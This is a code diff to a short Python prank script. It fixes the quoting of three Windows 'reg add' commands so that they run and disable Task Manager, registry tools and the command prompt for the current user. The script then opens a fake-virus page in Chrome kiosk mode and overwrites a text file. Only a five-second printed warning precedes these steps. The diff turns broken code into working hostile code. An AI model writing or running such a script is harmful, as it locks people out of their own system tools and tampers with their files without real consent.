@@ -2,9 +2,9 @@ import time
 import os
 print("I warned you! wait 5 secs or close window if this is ur pc.")
 time.sleep(5)
-os.system("reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f")
-os.system("reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f")
-os.system("reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f")
+os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
+os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f')
+os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f')
 os.system("C:\Program Files\Google\Chrome\Application\chrome.exe https://geekprank.com/fake-virus/ --kiosk")
 f = open("demofile3.txt", "w")
 f.write("Woops! I have deleted the content!")
